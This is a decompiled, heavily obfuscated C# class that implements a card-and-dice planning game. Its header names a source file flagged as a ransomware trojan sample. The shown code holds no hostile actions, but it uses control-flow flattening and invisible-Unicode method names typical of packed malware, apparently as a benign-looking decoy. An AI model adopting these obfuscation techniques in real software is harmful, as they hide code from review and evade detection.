// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Game
// Assembly: ILegacyEvidenceAdapt, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 7C8AEC27-D027-41D5-B71C-E99019A8E594
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a42b3919356aa815980faeac0fc6222bd4a2d6f6cc5bdc01c5a5f55014a9c66e.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Cytotechnologist
{
  public class Game
  {
    public readonly Rules Rules;
    public readonly Player[] Players;
    private readonly PlayerState[] _playerStates;
    private readonly Dice _dice;
    private List<Card> _deck;
    public readonly List<int> Winners = new List<int>();
    public readonly List<int> Losers = new List<int>();
    private int _currentPlayer = 2147483645;
    private int _currentTurn;
    private List<float> _chances;
    private readonly Random _random;
    private readonly StringBuilder _buffer;
    private bool _finished;
    private int _currentChanceIndex;

    public Game(JSONNode json, StringBuilder buffer)
    {
label_1:
      int num1 = -1639136176;
      JSONNode jsonNode;
      int count;
      int aIndex;
      int index;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -554997543)) % 18U)
        {
          case 0:
            int num3;
            num1 = num3 = aIndex < count ? -945889062 : (num3 = -689786265);
            continue;
          case 1:
            this._random = Game.\u200E​​⁭⁮⁮‍⁮‏‎⁬⁯​‪⁯‭⁬‫‬⁯⁮⁫⁮‪⁮⁯‎⁮‌‏​​‎‬‌‭⁭⁪‮⁫‮((int) DateTime.Now.Ticks);
            num1 = (int) num2 * -2071756117 ^ -619037068;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 234568957 ^ 1245188067;
            continue;
          case 4:
            aIndex = 0;
            num1 = (int) num2 * -577198177 ^ 1281749683;
            continue;
          case 5:
            this.Players[aIndex] = Player.Deserialize(jsonNode[aIndex]);
            num1 = -2079279688;
            continue;
          case 6:
            ++index;
            num1 = (int) num2 * -1793901199 ^ 869119665;
            continue;
          case 7:
            this.Players = new Player[count];
            num1 = (int) num2 * 213204318 ^ -2001921741;
            continue;
          case 8:
            this._playerStates = new PlayerState[count];
            index = 0;
            num1 = (int) num2 * 501280237 ^ -51021726;
            continue;
          case 9:
            num1 = (int) num2 * 573502716 ^ 282396265;
            continue;
          case 10:
            goto label_1;
          case 11:
            ++aIndex;
            num1 = (int) num2 * -1039491063 ^ 31444550;
            continue;
          case 12:
            int num4;
            num1 = num4 = index >= count ? -634344675 : (num4 = -511209445);
            continue;
          case 13:
            this._buffer = buffer;
            num1 = (int) num2 * 446314941 ^ -350210027;
            continue;
          case 14:
            this.Rules = Rules.Deserialize(json["rules"]);
            this._dice = new Dice();
            num1 = (int) num2 * 114952411 ^ 1530657732;
            continue;
          case 15:
            num1 = (int) num2 * -1080841453 ^ -350390587;
            continue;
          case 16:
            this._playerStates[index] = new PlayerState();
            num1 = -1771731379;
            continue;
          case 17:
            jsonNode = json["players"];
            count = jsonNode.Count;
            num1 = (int) num2 * 1167525632 ^ -1648027152;
            continue;
          default:
            goto label_20;
        }
      }
label_3:
      return;
label_20:;
    }

    public bool Finished
    {
      get
      {
        if (!this._finished)
          goto label_7;
label_1:
        int num1 = -80039153;
label_2:
        bool finished;
        PlayerState[] playerStates;
        int index;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1433679488)) % 12U)
          {
            case 0:
              goto label_7;
            case 1:
              num1 = (int) num2 * -585645848 ^ 1396757758;
              continue;
            case 3:
              num1 = (int) num2 * 1968704130 ^ -168938629;
              continue;
            case 4:
              ++index;
              num1 = -2068813971;
              continue;
            case 5:
              int num3;
              num1 = num3 = playerStates[index].State == State.Playing ? -697971886 : (num3 = -1985682440);
              continue;
            case 6:
              finished = true;
              num1 = (int) num2 * -654119020 ^ 503827925;
              continue;
            case 7:
              finished = true;
              num1 = (int) num2 * -1730899635 ^ -652938571;
              continue;
            case 8:
              index = 0;
              num1 = (int) num2 * -1755913231 ^ 381474267;
              continue;
            case 9:
              int num4;
              num1 = num4 = index < playerStates.Length ? -1717033835 : (num4 = -1848738006);
              continue;
            case 10:
              finished = false;
              num1 = (int) num2 * -996489335 ^ -3608876;
              continue;
            case 11:
              goto label_1;
            default:
              goto label_13;
          }
        }
label_13:
        return finished;
label_7:
        playerStates = this._playerStates;
        num1 = -905804656;
        goto label_2;
      }
    }

    public void ShuffleCards() => this._deck = new List<Card>((IEnumerable<Card>) this.Rules.Cards);

    public void StartNew()
    {
      this.ShuffleCards();
      this.Winners.Clear();
label_1:
      int num1 = -1712305043;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1563843869)) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Losers.Clear();
            this._currentPlayer = this.Players.Length;
            num1 = (int) num2 * -1538926981 ^ -916540429;
            continue;
          case 2:
            goto label_1;
          case 3:
            this._currentTurn = 0;
            num1 = (int) num2 * 869251922 ^ 244373419;
            continue;
          case 4:
            this._finished = false;
            this._currentChanceIndex = -1;
            this._chances = new List<float>((IEnumerable<float>) this.Rules.RiskChances);
            num1 = (int) num2 * -207471228 ^ -1328302787;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public void PlanningState()
    {
      int index = 0;
label_20:
      int num1 = index < this.Players.Length ? -1245213728 : (num1 = -1265024995);
      int num2;
      bool flag;
      PlayerState playerState;
      Player player;
      int planningCardsCount;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -991268712)) % 25U)
        {
          case 0:
            player = this.Players[index];
            num1 = (int) num3 * -883058060 ^ 706967862;
            continue;
          case 1:
            playerState.Resources -= (planningCardsCount - num2) * this.Rules.NormalPlanningCost;
            num1 = -1125791992;
            continue;
          case 2:
            ++index;
            num1 = (int) num3 * 15452784 ^ -934095134;
            continue;
          case 3:
            goto label_3;
          case 4:
            num1 = -1867685198;
            continue;
          case 5:
            planningCardsCount = player.PlanningCardsCount;
            num1 = (int) num3 * -605244900 ^ 1198315069;
            continue;
          case 6:
            num2 = planningCardsCount - this.Rules.NormalPlanningCount;
            num1 = -1995682188;
            continue;
          case 7:
            playerState.Resources -= num2 * this.Rules.NormalPlanningCost;
            num1 = (int) num3 * -2003623116 ^ 1348920769;
            continue;
          case 8:
            playerState = this._playerStates[index];
            num1 = (int) num3 * 778366053 ^ 679165062;
            continue;
          case 9:
            playerState.Sprint = 1;
            num1 = (int) num3 * -349502657 ^ -2007917229;
            continue;
          case 10:
            playerState.Sprint = -1;
            num1 = (int) num3 * 2047523557 ^ 1492556732;
            continue;
          case 11:
            num1 = (int) num3 * -590727949 ^ -509346554;
            continue;
          case 12:
            int num4 = flag ? 1286148576 : (num4 = 22393120);
            num1 = num4 ^ (int) num3 * -1478763854;
            continue;
          case 13:
            int num5 = planningCardsCount != 0 ? -1892521103 : (num5 = -354089984);
            num1 = num5 ^ (int) num3 * 913247505;
            continue;
          case 14:
            num1 = -1158176702;
            continue;
          case 15:
            flag = num2 > 0;
            num1 = -990904277;
            continue;
          case 16:
            num2 = 0;
            num1 = (int) num3 * 783477911 ^ 2088994724;
            continue;
          case 17:
            num1 = -1245213728;
            continue;
          case 18:
            playerState.Sprint = 0;
            playerState.Resources = this.Rules.InitialResources;
            playerState.State = State.Playing;
            num1 = (int) num3 * 251298478 ^ 1103042610;
            continue;
          case 19:
            num2 = 0;
            num1 = -817063127;
            continue;
          case 20:
            int num6 = player.UseOneMorePlanningSprint ? -917285893 : (num6 = -772311124);
            num1 = num6 ^ (int) num3 * -571684868;
            continue;
          case 21:
            num1 = (int) num3 * -191592060 ^ 103308701;
            continue;
          case 22:
            playerState.Resources -= num2 * this.Rules.OverPlanningCost;
            num1 = (int) num3 * -25960600 ^ -679110659;
            continue;
          case 23:
            goto label_20;
          case 24:
            num1 = (int) num3 * -902872540 ^ -988872275;
            continue;
          default:
            goto label_27;
        }
      }
label_3:
      return;
label_27:;
    }

    public void TurnState()
    {
label_1:
      int num1 = 247966695;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 797534289)) % 11U)
        {
          case 0:
            num1 = (int) num2 * 645361708 ^ -541685775;
            continue;
          case 1:
            this.Print((object) "\n\nGAME STATE\n{0}\n\n-- END OF TURN {1} --\n\n", (object) this, (object) this._currentTurn);
            num1 = (int) num2 * 211487470 ^ 458307545;
            continue;
          case 2:
            int num3 = this._currentPlayer < this.Players.Length ? 645557805 : (num3 = 1569584489);
            num1 = num3 ^ (int) num2 * -943707087;
            continue;
          case 3:
            this._currentPlayer = 0;
            int num4 = this._currentTurn <= 0 ? -1964073688 : (num4 = -1432377444);
            num1 = num4 ^ (int) num2 * 1575794079;
            continue;
          case 4:
            this.Print((object) Game.\u206B‏⁪‮‭‏‍​‪⁮‬⁪⁭⁭⁯‏‌‭⁬‏‪‮‪‏⁯‍‭‍‬‪‏‬‍‭‍‭⁭‫‭‬‮("-- BEGINNING OF TURN ", (++this._currentTurn).ToString(), " --"));
            this._currentChanceIndex = (this._currentChanceIndex + 1) % this._chances.Count;
            this.Print((object) Game.\u202A⁫⁯‬⁭‫‏⁫‪‮⁯‬⁪‏⁭‮⁬‮⁬‫⁮⁬⁭‮‭‌⁭‍⁭⁯‭‮⁭‫‫‪‎‭‫⁯‮("RISK CHANCE: ", this.Rules.RiskChances[this._currentChanceIndex].ToString()));
            num1 = 1950509454;
            continue;
          case 5:
            goto label_3;
          case 6:
            ++this._currentPlayer;
            num1 = (int) num2 * 1370721302 ^ 1087765501;
            continue;
          case 7:
            num1 = (int) num2 * 706788005 ^ 779952193;
            continue;
          case 8:
            this.PlayerTurn(this._currentPlayer);
            num1 = 1131152946;
            continue;
          case 9:
            goto label_1;
          case 10:
            num1 = (int) num2 * -344875098 ^ 615596438;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    private void PlayerTurn(int playerIndex)
    {
label_1:
      int num1 = 2134380902;
      while (true)
      {
        uint num2;
        int index;
        bool flag1;
        int num3;
        bool flag2;
        bool flag3;
        PlayerState playerState1;
        bool flag4;
        bool flag5;
        bool flag6;
        PlayerState playerState2;
        Card card;
        bool flag7;
        bool flag8;
        int num4;
        bool flag9;
        bool flag10;
        bool flag11;
        Player player;
        bool flag12;
        bool flag13;
        bool flag14;
        int num5;
        int num6;
        switch ((num2 = (uint) (num1 ^ 450971797)) % 84U)
        {
          case 0:
            PlayerState playerState3 = playerState1;
            this.Print((object) Game.\u202A⁫⁯‬⁭‫‏⁫‪‮⁯‬⁪‏⁭‮⁬‮⁬‫⁮⁬⁭‮‭‌⁭‍⁭⁯‭‮⁭‫‫‪‎‭‫⁯‮("\t", playerState3 != null ? Game.\u200B‪‫⁯‌‌‌⁫⁪‪​⁬‮⁬‮⁭‬‍‏‬‭‫‍‏⁬‮⁫⁬‏‮⁯⁮⁯‫⁬‭⁪⁬⁯⁯‮((object) playerState3) : (string) null));
            num1 = 660304754;
            continue;
          case 1:
            int num7 = !flag13 ? -1595186987 : (num7 = -639308290);
            num1 = num7 ^ (int) num2 * 1744789849;
            continue;
          case 2:
            this._finished = true;
            num3 = 0;
            num1 = (int) num2 * -1414985496 ^ 1441967298;
            continue;
          case 3:
            flag11 = true;
            num1 = (int) num2 * 1329740003 ^ -1591088877;
            continue;
          case 4:
            num1 = (int) num2 * -1325020177 ^ 277052738;
            continue;
          case 5:
            num1 = (int) num2 * 1498454554 ^ 277579869;
            continue;
          case 6:
            num1 = 1338806429;
            continue;
          case 7:
            this.Print((object) "CARD: {0}, {1}{2} {3} and {4}", (object) card, flag2 ? (object) "ALL " : (object) "", flag7 ? (object) "receives" : (object) "pays", (object) Game.\u202A⁫⁯⁬⁭⁮‍⁫⁪‌‍‪⁫⁯‭‏‪‎⁭‍‌‮‬‮‭‪‮​‬‍​⁯‏‫‫⁮⁫⁯‭⁫‮(num4), flag11 ? (object) "advance" : (object) "stay");
            num1 = 1844379536;
            continue;
          case 8:
            this.Print((object) Game.\u202A⁫⁯‬⁭‫‏⁫‪‮⁯‬⁪‏⁭‮⁬‮⁬‫⁮⁬⁭‮‭‌⁭‍⁭⁯‭‮⁭‫‫‪‎‭‫⁯‮("\nPLAYER ", playerIndex.ToString()));
            flag10 = playerState1.State != 0;
            num1 = (int) num2 * -1845020324 ^ 1430620557;
            continue;
          case 9:
            num1 = (int) num2 * -1077302636 ^ -420787484;
            continue;
          case 10:
            int num8;
            num1 = num8 = playerState1.Sprint > this.Rules.SprintCount ? 1228607102 : (num8 = 1677301421);
            continue;
          case 11:
            ++num3;
            num1 = 1039677330;
            continue;
          case 12:
            int num9 = flag10 ? -1675957561 : (num9 = -1687366117);
            num1 = num9 ^ (int) num2 * 314167084;
            continue;
          case 13:
            num1 = 875053447;
            continue;
          case 14:
            flag5 = !this._dice.Roll(this._chances[this._currentChanceIndex]);
            num1 = 846341899;
            continue;
          case 15:
            this.Losers.Add(playerIndex);
            num1 = (int) num2 * -852135337 ^ -1445512062;
            continue;
          case 16:
            num1 = (int) num2 * 651168380 ^ 687822844;
            continue;
          case 17:
            num1 = (int) num2 * -710595411 ^ 189753487;
            continue;
          case 18:
            flag8 = index < this._playerStates.Length;
            num1 = 1502425841;
            continue;
          case 19:
            num1 = (int) num2 * 116987142 ^ 1602468547;
            continue;
          case 20:
            num1 = 460452974;
            continue;
          case 21:
            num1 = 2023130938;
            continue;
          case 22:
            flag14 = playerState1.Sprint < 0;
            num1 = 16503252;
            continue;
          case 23:
            card = this.DrawCard();
            num1 = (int) num2 * -1096643098 ^ -1917617292;
            continue;
          case 24:
            num1 = (int) num2 * 904819864 ^ -455931344;
            continue;
          case 25:
            flag3 = !flag2;
            num1 = (int) num2 * 357517367 ^ -1745883018;
            continue;
          case 26:
            num1 = (int) num2 * 1717726158 ^ 1867396440;
            continue;
          case 27:
            num1 = (int) num2 * 473074863 ^ 103035569;
            continue;
          case 28:
            goto label_1;
          case 29:
            int num10 = !this.Rules.OnlyOneWinner ? 1975527509 : (num10 = 1682099956);
            num1 = num10 ^ (int) num2 * 460219543;
            continue;
          case 30:
            num5 = card.Impact - player.PlannedForCard(card.Type);
            flag11 = num5 < this.Rules.StayOnSprintMinDiff;
            num1 = (int) num2 * -1764063483 ^ 77687686;
            continue;
          case 31:
            this.Losers.Add(index);
            num1 = (int) num2 * 1571963129 ^ 1820346295;
            continue;
          case 32:
            num1 = (int) num2 * -591619086 ^ 797230790;
            continue;
          case 33:
            num4 = Game.\u206D⁪‪⁮⁫‫⁫‍‭⁫‪⁪⁯‏‍​‮​‍‌‭‭‏‮⁮‍‬‍⁬⁪‎⁫⁪‏‎⁫‎⁭‌‍‮(0, num5);
            num1 = (int) num2 * -565522382 ^ -966857734;
            continue;
          case 34:
            num1 = (int) num2 * -857750040 ^ -506217709;
            continue;
          case 35:
            player = this.Players[playerIndex];
            playerState1 = this._playerStates[playerIndex];
            num1 = (int) num2 * -2110297108 ^ 1281762389;
            continue;
          case 36:
            num1 = (int) num2 * 1920813210 ^ 62349823;
            continue;
          case 37:
            flag13 = !flag7;
            num1 = (int) num2 * -1943594447 ^ 926844185;
            continue;
          case 38:
            flag1 = playerState1.Resources < 0;
            num1 = (int) num2 * -447605329 ^ -223862707;
            continue;
          case 39:
            num1 = (int) num2 * -1980348886 ^ 312890439;
            continue;
          case 40:
            flag4 = !this.Losers.Contains(playerIndex);
            num1 = (int) num2 * -834814737 ^ -1786957983;
            continue;
          case 41:
            num1 = 777811516;
            continue;
          case 42:
            playerState2.State = State.Lose;
            int num11;
            num1 = num11 = !this.Losers.Contains(index) ? 2056660062 : (num11 = 763173424);
            continue;
          case 43:
            flag11 = true;
            this.Print((object) "CARD: none, advance");
            num1 = (int) num2 * -1042503702 ^ -1215521669;
            continue;
          case 44:
            goto label_3;
          case 45:
            flag6 = num3 == playerIndex;
            num1 = (int) num2 * 1586028409 ^ -965306908;
            continue;
          case 46:
            int num12;
            num1 = num12 = !this.Losers.Contains(num3) ? 691080043 : (num12 = 613685969);
            continue;
          case 47:
            ++playerState1.Sprint;
            num1 = (int) num2 * -1054205659 ^ 736706128;
            continue;
          case 48:
            int num13 = !flag6 ? -818620037 : (num13 = -984311324);
            num1 = num13 ^ (int) num2 * 2011837625;
            continue;
          case 49:
            ++index;
            num1 = 1532984515;
            continue;
          case 50:
            int num14 = !flag9 ? 2011125421 : (num14 = 2062999820);
            num1 = num14 ^ (int) num2 * 811284557;
            continue;
          case 51:
            int num15;
            num1 = num15 = num3 >= this._playerStates.Length ? 1177205342 : (num15 = 1088884693);
            continue;
          case 52:
            int num16 = !flag8 ? -54911612 : (num16 = -1996835545);
            num1 = num16 ^ (int) num2 * -1657979652;
            continue;
          case 53:
            num1 = 962173998;
            continue;
          case 54:
            int num17 = flag5 ? 1296623255 : (num17 = 577922842);
            num1 = num17 ^ (int) num2 * -331458705;
            continue;
          case 55:
            num1 = 1677301421;
            continue;
          case 56:
            int num18 = flag4 ? -116454742 : (num18 = -902610037);
            num1 = num18 ^ (int) num2 * -936055145;
            continue;
          case 57:
            playerState1.Resources -= num4;
            num1 = (int) num2 * 1207769915 ^ -1053749340;
            continue;
          case 58:
            this.Losers.Add(num3);
            num1 = (int) num2 * -998049483 ^ 1873296199;
            continue;
          case 59:
            num1 = (int) num2 * -876970516 ^ -273521950;
            continue;
          case 60:
            index = 0;
            num1 = (int) num2 * -1765682261 ^ 50974799;
            continue;
          case 61:
            num1 = (int) num2 * 1466770112 ^ -1196382879;
            continue;
          case 62:
            flag11 = false;
            num1 = 1476669320;
            continue;
          case 63:
            flag12 = flag11;
            num1 = 1429003424;
            continue;
          case 64:
            playerState1.State = State.Won;
            this.Winners.Add(playerIndex);
            num1 = (int) num2 * 466586966 ^ 61985848;
            continue;
          case 65:
            this.Print((object) playerState1.State);
            num1 = (int) num2 * -171692317 ^ -616948102;
            continue;
          case 66:
            num1 = 1560733666;
            continue;
          case 67:
            num4 = card.Impact;
            num1 = (int) num2 * 1869765508 ^ -43868406;
            continue;
          case 68:
            playerState2.Resources -= Game.\u206D⁪‪⁮⁫‫⁫‍‭⁫‪⁪⁯‏‍​‮​‍‌‭‭‏‮⁮‍‬‍⁬⁪‎⁫⁪‏‎⁫‎⁭‌‍‮(0, num4 - this.Players[index].PlannedForCard(card.Type));
            flag9 = playerState2.Resources >= 0;
            num1 = (int) num2 * 1433152228 ^ 318852135;
            continue;
          case 69:
            int num19 = flag14 ? -1062051020 : (num19 = -1398019628);
            num1 = num19 ^ (int) num2 * -1539183225;
            continue;
          case 70:
            num1 = (int) num2 * 1250381549 ^ 53938864;
            continue;
          case 71:
            playerState2 = this._playerStates[index];
            num1 = (int) num2 * 14797022 ^ -1657010421;
            continue;
          case 72:
            num1 = 182028888;
            continue;
          case 73:
            playerState1.State = State.Lose;
            num1 = (int) num2 * 1419481686 ^ 34337003;
            continue;
          case 74:
            num1 = (int) num2 * 1655324337 ^ 838260692;
            continue;
          case 75:
            num1 = (int) num2 * -1267032300 ^ 2077360741;
            continue;
          case 76:
            num6 = card.Type == 4 ? 1 : 0;
            break;
          case 77:
            int num20 = flag12 ? -1943934051 : (num20 = -1398227620);
            num1 = num20 ^ (int) num2 * -1622247757;
            continue;
          case 78:
            int num21 = flag1 ? 1849492840 : (num21 = 1834206764);
            num1 = num21 ^ (int) num2 * -599565886;
            continue;
          case 79:
            flag7 = card.Impact < 0;
            if (this.Rules.EconomicsAffectsAll)
            {
              num1 = (int) num2 * -1038677953 ^ -1341084784;
              continue;
            }
            num6 = 0;
            break;
          case 80:
            int num22 = flag3 ? -446351759 : (num22 = -869346745);
            num1 = num22 ^ (int) num2 * -237481902;
            continue;
          case 81:
            num1 = (int) num2 * 554690323 ^ 493564402;
            continue;
          case 82:
            num1 = 1788618946;
            continue;
          case 83:
            ++playerState1.Sprint;
            this.Print((object) "Still planning");
            num1 = (int) num2 * -1865461668 ^ -1975848534;
            continue;
          default:
            goto label_89;
        }
        flag2 = num6 != 0;
        num1 = 290310692;
      }
label_3:
      return;
label_89:;
    }

    private Card DrawCard()
    {
label_1:
      int num1 = 1217657886;
      bool flag;
      Card card1;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2105951431)) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            flag = this._deck.Count <= 0;
            num1 = (int) num2 * 31598457 ^ 1021911449;
            continue;
          case 2:
            num1 = (int) num2 * -440021412 ^ -115905439;
            continue;
          case 3:
            this.ShuffleCards();
            num1 = (int) num2 * -1628401533 ^ 938709844;
            continue;
          case 5:
            num1 = (int) num2 * -1910633103 ^ 730161838;
            continue;
          case 6:
            Card card2 = this._deck[0];
            this._deck.RemoveAt(0);
            card1 = card2;
            num1 = 649911858;
            continue;
          case 7:
            int num3 = flag ? -834790681 : (num3 = -668841854);
            num1 = num3 ^ (int) num2 * -1121615563;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return card1;
    }

    public string ToString(bool initial)
    {
      string str1 = "";
label_1:
      int num1 = 1513422126;
      int index;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 886955707)) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            str2 = str1;
            num1 = (int) num2 * -1811609175 ^ -1004589364;
            continue;
          case 2:
            string[] strArray = new string[5]
            {
              str1,
              index.ToString(),
              ": ",
              null,
              null
            };
            PlayerState playerState = this._playerStates[index];
            strArray[3] = playerState != null ? Game.\u200B‪‫⁯‌‌‌⁫⁪‪​⁬‮⁬‮⁭‬‍‏‬‭‫‍‏⁬‮⁫⁬‏‮⁯⁮⁯‫⁬‭⁪⁬⁯⁯‮((object) playerState) : (string) null;
            strArray[4] = "\n";
            str1 = Game.\u202C⁭‌⁯‫‌‭‭⁯‫‮​‭‍‏‭⁮⁫⁬‬⁮⁯⁪‭‍‮‮‏‌‌‏⁬⁫‫‪‎‫​‭⁯‮(strArray);
            num1 = 37083568;
            continue;
          case 3:
            ++index;
            num1 = (int) num2 * 66296085 ^ -1313621856;
            continue;
          case 4:
            int num3;
            num1 = num3 = index >= this._playerStates.Length ? 1303931298 : (num3 = 889741553);
            continue;
          case 5:
            index = 0;
            num1 = (int) num2 * -274663303 ^ -757680342;
            continue;
          case 6:
            num1 = (int) num2 * 1545326263 ^ 2092368550;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return str2;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1015068163;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -709857304)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str = this.ToString(false);
            num1 = (int) num2 * -328477056 ^ 685837606;
            continue;
          case 2:
            num1 = (int) num2 * -292965951 ^ 919845749;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private void Print(object text, params object[] more)
    {
label_1:
      int num1 = -176561449;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1742974770)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            str = Game.\u206A‪‬‌‪⁬⁭⁪⁫‭‏‏⁭‭‍⁭⁮‫‏‭‬⁭‎⁯‫‎⁯‭‍‭​⁫‫⁬‫‫‏⁬⁫‬‮(Game.\u200B‪‫⁯‌‌‌⁫⁪‪​⁬‮⁬‮⁭‬‍‏‬‭‫‍‏⁬‮⁫⁬‏‮⁯⁮⁯‫⁬‭⁪⁬⁯⁯‮(text), more);
            num1 = (int) num2 * -627565628 ^ 1718690812;
            continue;
          case 2:
            Game.\u206B⁪‮‬⁪⁮‍‌⁪‪⁭‍‎‍‫‫‫⁪⁯‎‏⁮⁮‫‍⁬⁫‏‏‪‫‮⁫‬⁯​⁫‪⁭⁮‮(this._buffer, str);
            num1 = (int) num2 * 2101010638 ^ -2068507050;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    static Random \u200E​​⁭⁮⁮‍⁮‏‎⁬⁯​‪⁯‭⁬‫‬⁯⁮⁫⁮‪⁮⁯‎⁮‌‏​​‎‬‌‭⁭⁪‮⁫‮([In] int obj0) => new Random(obj0);

    static string \u206B‏⁪‮‭‏‍​‪⁮‬⁪⁭⁭⁯‏‌‭⁬‏‪‮‪‏⁯‍‭‍‬‪‏‬‍‭‍‭⁭‫‭‬‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static string \u202A⁫⁯‬⁭‫‏⁫‪‮⁯‬⁪‏⁭‮⁬‮⁬‫⁮⁬⁭‮‭‌⁭‍⁭⁯‭‮⁭‫‫‪‎‭‫⁯‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static int \u206D⁪‪⁮⁫‫⁫‍‭⁫‪⁪⁯‏‍​‮​‍‌‭‭‏‮⁮‍‬‍⁬⁪‎⁫⁪‏‎⁫‎⁭‌‍‮([In] int obj0, [In] int obj1) => Math.Max(obj0, obj1);

    static int \u202A⁫⁯⁬⁭⁮‍⁫⁪‌‍‪⁫⁯‭‏‪‎⁭‍‌‮‬‮‭‪‮​‬‍​⁯‏‫‫⁮⁫⁯‭⁫‮([In] int obj0) => Math.Abs(obj0);

    static string \u200B‪‫⁯‌‌‌⁫⁪‪​⁬‮⁬‮⁭‬‍‏‬‭‫‍‏⁬‮⁫⁬‏‮⁯⁮⁯‫⁬‭⁪⁬⁯⁯‮([In] object obj0) => obj0.ToString();

    static string \u202C⁭‌⁯‫‌‭‭⁯‫‮​‭‍‏‭⁮⁫⁬‬⁮⁯⁪‭‍‮‮‏‌‌‏⁬⁫‫‪‎‫​‭⁯‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206A‪‬‌‪⁬⁭⁪⁫‭‏‏⁭‭‍⁭⁮‫‏‭‬⁭‎⁯‫‎⁯‭‍‭​⁫‫⁬‫‫‏⁬⁫‬‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static StringBuilder \u206B⁪‮‬⁪⁮‍‌⁪‪⁭‍‎‍‫‫‫⁪⁯‎‏⁮⁮‫‍⁬⁫‏‏‪‫‮⁫‬⁯​⁫‪⁭⁮‮(
      [In] StringBuilder obj0,
      [In] string obj1)
    {
      return obj0.AppendLine(obj1);
    }
  }
}
